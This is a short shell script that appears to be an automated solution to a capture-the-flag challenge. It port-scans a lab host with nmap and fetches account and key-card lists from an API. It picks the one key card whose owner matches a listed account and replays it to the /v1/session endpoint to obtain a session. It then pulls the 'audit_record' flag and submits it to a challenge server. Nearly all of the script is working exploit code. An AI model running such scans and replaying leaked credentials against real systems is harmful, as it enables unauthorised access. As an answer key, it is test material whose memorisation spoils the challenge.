#!/bin/sh
set -eu

host=172.20.0.141
base="http://${host}:8080"

nmap -n -p 8080 "$host" | grep -q '8080/tcp open'

candidate=$(python3 -c '
import json, urllib.request
base = "http://172.20.0.141:8080"
def get(path):
    with urllib.request.urlopen(base + path) as r:
        return json.load(r)
accounts = {a["id"] for a in get("/v1/accounts")["accounts"]}
cards = get("/v1/key-cards")["key_cards"]
matched = [c for c in cards if c["owner"] in accounts]
if len(matched) != 1:
    raise SystemExit("Expected one account shared by the two catalogues")
print(json.dumps(matched[0]))
')

response=$(curl -s "$base/v1/session" -H 'Content-Type: application/json' --data-binary "$candidate")
flag=$(python3 -c 'import json,sys; print(json.load(sys.stdin)["audit_record"])' <<EOF
$response
EOF
)

submission=$(python3 -c 'import json,sys; print(json.dumps({"challenge_id":"scl-challenge-frame-2a070f","task_id":"task1","flag":sys.argv[1]}))' "$flag")
curl -s http://172.20.0.3/api/challenges/submit -X POST -H 'Content-Type: application/json' --data-binary "$submission"
